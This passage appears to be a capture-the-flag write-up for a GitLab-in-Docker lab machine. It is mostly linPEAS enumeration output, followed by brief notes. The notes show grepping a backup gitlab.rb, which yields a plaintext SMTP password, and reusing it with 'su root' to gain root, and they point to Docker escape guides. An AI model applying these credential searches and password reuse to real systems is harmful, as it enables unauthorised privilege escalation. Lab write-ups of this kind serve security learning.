-rw-r--r-- 1 root root 26 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/omniauth-oauth-1.1.0/.rspec
-rw-r--r-- 1 root root 874 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/omniauth-oauth-1.1.0/.rubocop.yml
-rw-r--r-- 1 root root 15 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/aes_key_wrap-1.0.1/.travis.yml
-rw-r--r-- 1 root root 6 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/aes_key_wrap-1.0.1/.ruby-version
-rw-r--r-- 1 root root 31 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/aes_key_wrap-1.0.1/.rspec
-rw-r--r-- 1 root root 1222 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/nokogiri-1.8.4/.travis.yml
-rw-r--r-- 1 root root 0 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/nokogiri-1.8.4/.gemtest
-rw-r--r-- 1 root root 205 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/nokogiri-1.8.4/.editorconfig
-rw-r--r-- 1 root root 0 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/nokogiri-1.8.4/ext/nokogiri/.sitearchdir.-.nokogiri.time
-rw-r--r-- 1 root root 384 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/nokogiri-1.8.4/.autotest
-rw-r--r-- 1 root root 192 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/nokogiri-1.8.4/.cross_rubies
-rw-r--r-- 1 root root 418 Nov 20  2018 /opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/mini_mime-1.0.1/.travis.yml

[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 79639 Dec  1 19:20 /opt/backup/gitlab.rb
-rw-r--r-- 1 root root 872 Dec  7 09:25 /opt/backup/docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 /opt/backup/gitlab-secrets.json
-rw-r--r-- 1 gitlab-psql gitlab-psql 655 May 16  2017 /opt/gitlab/embedded/cookbooks/cache/backup/var/opt/gitlab/postgresql/.profile.chef-20201204141228.324037

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/assets/download-package
/assets/gitlab.rb
/assets/setup
/assets/sshd_config
/assets/update-permissions
#)You_can_write_even_more_files_inside_last_directory

/dev/mqueue
/dev/shm
/dev/shm/gitlab/sidekiq
/dev/shm/gitlab/sidekiq/counter_process_id_507-0.db
/dev/shm/gitlab/sidekiq/gauge_livesum_process_id_507-0.db
/dev/shm/gitlab/sidekiq/histogram_process_id_507-0.db
/dev/shm/gitlab/unicorn
/dev/shm/gitlab/unicorn/counter_process_id_626-0.db
/dev/shm/gitlab/unicorn/counter_worker_id_0-0.db
/dev/shm/gitlab/unicorn/counter_worker_id_1-0.db
/dev/shm/gitlab/unicorn/counter_worker_id_2-0.db
/dev/shm/gitlab/unicorn/counter_worker_id_3-0.db
#)You_can_write_even_more_files_inside_last_directory

/opt/gitlab/embedded/service/gitlab-rails/db/schema.rb
/opt/gitlab/etc/gitlab-rails
/opt/gitlab/etc/gitlab-workhorse
/opt/gitlab/var/unicorn
/opt/gitlab/var/unicorn/unicorn.pid
/run/lock
/tmp
/tmp/gitaly-ruby017110446
/var/log/gitlab
/var/log/gitlab/gitaly
/var/log/gitlab/gitlab-monitor
/var/log/gitlab/gitlab-rails
/var/log/gitlab/gitlab-rails/api_json.log
/var/log/gitlab/gitlab-rails/api_json.log.1.gz
/var/log/gitlab/gitlab-rails/api_json.log.2.gz
/var/log/gitlab/gitlab-rails/api_json.log.3.gz
/var/log/gitlab/gitlab-rails/api_json.log.4.gz
#)You_can_write_even_more_files_inside_last_directory

/var/log/gitlab/gitlab-shell
/var/log/gitlab/gitlab-shell/gitlab-shell.log
/var/log/gitlab/gitlab-shell/gitlab-shell.log.1.gz
/var/log/gitlab/gitlab-shell/gitlab-shell.log.2.gz
/var/log/gitlab/gitlab-shell/gitlab-shell.log.3.gz
/var/log/gitlab/gitlab-shell/gitlab-shell.log.4.gz
#)You_can_write_even_more_files_inside_last_directory

/var/log/gitlab/gitlab-workhorse
/var/log/gitlab/sidekiq
/var/log/gitlab/unicorn
/var/log/gitlab/unicorn/unicorn_stderr.log
/var/log/gitlab/unicorn/unicorn_stderr.log.1.gz
/var/log/gitlab/unicorn/unicorn_stderr.log.2.gz
/var/log/gitlab/unicorn/unicorn_stderr.log.3.gz
/var/log/gitlab/unicorn/unicorn_stderr.log.4.gz
#)You_can_write_even_more_files_inside_last_directory

/var/tmp

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group git:


[+] Searching passwords in config PHP files

[+] Checking for TTY (sudo/su) passwords in audit logs

[+] Finding IPs inside logs (limit 70)
    571 10.10.10.98
    116 10.10.14.21
     83 10.10.10.220
     81 1.16.04.1
     26 0.16.04.1
     18 0.16.04.3
     17 10.10.14.5
      2 0.99.7.1
      1 0.5.5.1

[+] Finding passwords inside logs (limit 70)
  Parameters: {"authenticity_token"=>"[FILTERED]", "user"=>{"login"=>"slyone@slyone.com", "password"=>"[FILTERED]", "remember_me"=>"0"}}
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2018-11-13 14:02:52 configure base-passwd:amd64 3.5.39 3.5.39
2018-11-13 14:02:52 install base-passwd:amd64 <none> 3.5.39
2018-11-13 14:02:52 status half-configured base-passwd:amd64 3.5.39
2018-11-13 14:02:52 status half-installed base-passwd:amd64 3.5.39
2018-11-13 14:02:52 status unpacked base-passwd:amd64 3.5.39
2018-11-13 14:02:53 status installed base-passwd:amd64 3.5.39
2018-11-13 14:02:58 status half-configured base-passwd:amd64 3.5.39
2018-11-13 14:02:58 status half-installed base-passwd:amd64 3.5.39
2018-11-13 14:02:58 status unpacked base-passwd:amd64 3.5.39
2018-11-13 14:02:58 upgrade base-passwd:amd64 3.5.39 3.5.39
2018-11-13 14:03:14 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2018-11-13 14:03:14 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:03:14 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:03:21 configure base-passwd:amd64 3.5.39 <none>
2018-11-13 14:03:21 status half-configured base-passwd:amd64 3.5.39
2018-11-13 14:03:21 status unpacked base-passwd:amd64 3.5.39
2018-11-13 14:03:22 status installed base-passwd:amd64 3.5.39
2018-11-13 14:03:51 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2018-11-13 14:03:51 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:03:51 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:03:52 status installed passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:04:45 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
2018-11-13 14:04:45 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:04:45 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:04:45 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2018-11-13 14:04:45 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
2018-11-13 14:04:45 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
2018-11-13 14:04:46 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
2018-11-13 14:04:46 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
2018-11-13 14:04:46 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
Binary file /var/log/gitlab/gitlab-rails/production.log.7.gz matches
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...
Setting up passwd (1:4.2-3.1ubuntu5) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.39) ...
Unpacking base-passwd (3.5.39) over (3.5.39) ...
Unpacking passwd (1:4.2-3.1ubuntu5) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:

[+] Finding emails inside logs (limit 70)
     11 slyone@slyone.com
      4 ftpmaster@ubuntu.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding passwords inside key folders (limit 70) - only PHP files

[+] Finding passwords inside key folders (limit 70) - no PHP files
/etc/debconf.conf:#BindPasswd: secret
/etc/nsswitch.conf:passwd:         compat
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/opt/backup/docker-compose.yml:        gitlab_rails['initial_root_password']=File.read('/root_pass')
/opt/backup/gitlab.rb:#     password: '_the_password_of_the_bind_user'
/opt/backup/gitlab.rb:#     password: MD5_PASSWORD_HASH
/opt/backup/gitlab.rb:#     password: PASSWORD
/opt/backup/gitlab.rb:# geo_postgresql['pgbouncer_user_password'] = nil
/opt/backup/gitlab.rb:# geo_secondary['db_password'] = nil
/opt/backup/gitlab.rb:# gitlab_rails['db_password'] = nil
/opt/backup/gitlab.rb:# gitlab_rails['incoming_email_password'] = "[REDACTED]"
/opt/backup/gitlab.rb:# gitlab_rails['initial_root_password'] = "password"
/opt/backup/gitlab.rb:# gitlab_rails['redis_password'] = nil
/opt/backup/gitlab.rb:# postgresql['pgbouncer_user_password'] = nil
/opt/backup/gitlab.rb:# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
/opt/backup/gitlab.rb:# redis['master_password'] = 'redis-password-goes-here'
/opt/backup/gitlab.rb:# redis['password'] = 'redis-password-goes-here'
/opt/backup/gitlab.rb:gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
/var/opt/gitlab/gitlab-rails/etc/database.yml:  password: 
/var/opt/gitlab/gitlab-rails/etc/gitlab.yml:    password: 
/var/opt/gitlab/gitlab-shell/config.yml:#  password: somepass
/var/opt/gitlab/gitlab-workhorse/config.toml:Password = ""

[+] Finding possible password variables inside key folders (limit 140)
/var/opt/gitlab/gitlab-rails/etc/secrets.yml:  openid_connect_signing_key: |
/opt/backup/gitlab.rb:#     'accesskey' => 'AKIAKIAKI',
/opt/backup/gitlab.rb:#     'secretkey' => 'secret123',
/opt/backup/gitlab.rb:#   'aws_access_key_id' => 'AKIAKIAKI',
/opt/backup/gitlab.rb:#   'aws_access_key_id' => 'AWS_ACCESS_KEY_ID',
/opt/backup/gitlab.rb:#   'aws_secret_access_key' => 'AWS_SECRET_ACCESS_KEY',
/opt/backup/gitlab.rb:#   'aws_secret_access_key' => 'secret123'
/opt/backup/gitlab.rb:#   DATABASE_NAME: {
/opt/backup/gitlab.rb:# alertmanager['admin_email'] = 'admin@example.com'
/opt/backup/gitlab.rb:# geo_secondary['db_database'] = "gitlabhq_geo_production"
/opt/backup/gitlab.rb:# geo_secondary['db_host'] = "/var/opt/gitlab/geo-postgresql"
/opt/backup/gitlab.rb:# geo_secondary['db_port'] = 5431
/opt/backup/gitlab.rb:# geo_secondary['db_username'] = "gitlab_geo"
/opt/backup/gitlab.rb:# gitaly['auth_token'] = '<secret>'
/opt/backup/gitlab.rb:# gitlab_rails['admin_email_worker_cron'] = "0 0 * * 0"
/opt/backup/gitlab.rb:# gitlab_rails['db_database'] = "gitlabhq_production"
/opt/backup/gitlab.rb:# gitlab_rails['db_host'] = nil
/opt/backup/gitlab.rb:# gitlab_rails['db_port'] = 5432
/opt/backup/gitlab.rb:# gitlab_rails['db_username'] = "gitlab"
/opt/backup/gitlab.rb:# mattermost['database_name'] = 'mattermost_production'
/opt/backup/gitlab.rb:# pgbouncer['client_idle_timeout'] = 0
/opt/backup/gitlab.rb:# pgbouncer['max_db_connections'] = nil
/opt/backup/gitlab.rb:# user['git_user_email'] = "gitlab@#{node['fqdn']}"
/opt/backup/gitlab.rb:# user['git_user_name'] = "GitLab"

[+] Finding possible password in config files
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,
 /etc/adduser.conf
passwd
 /etc/nsswitch.conf
passwd:         compat
 /etc/init/passwd.conf
passwd - clear locks on passwd and related files
passwd to avoid million duplicate bug reports
passwd locks"
passwd.lock /etc/group.lock /etc/subuid.lock /etc/subgid.lock
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret

[+] Finding 'username' string inside key folders (limit 70)
/var/opt/gitlab/gitlab-rails/etc/database.yml:  username: "gitlab"
/var/opt/gitlab/gitlab-rails/etc/gitlab.yml:    allow_username_or_email_login: 
/var/opt/gitlab/gitlab-rails/etc/gitlab.yml:    lowercase_usernames: 
/var/opt/gitlab/gitlab-shell/config.yml:audit_usernames: 

[+] Searching specific hashes inside files - less false positives (limit 70)



ls
cd ..
ls
REVISION
RUBY_VERSION
VERSION
etc
shared
sockets
tmp
upgrade-status
uploads
working


## Break out of Docker



https://fdlucifer.github.io/2020/12/16/ready/
https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1



Looking at LinPeas.sh there is a password in the gitlab.rb 

$ cat /opt/backup/gitlab.rb | grep smtp
SMTP Password present in in gitlab.rb file

When I used this password to switch to user root I could easily switch.
Switching to User Root

$ su root

~wW59U!ZKMbG9+*#h

# whoami && id

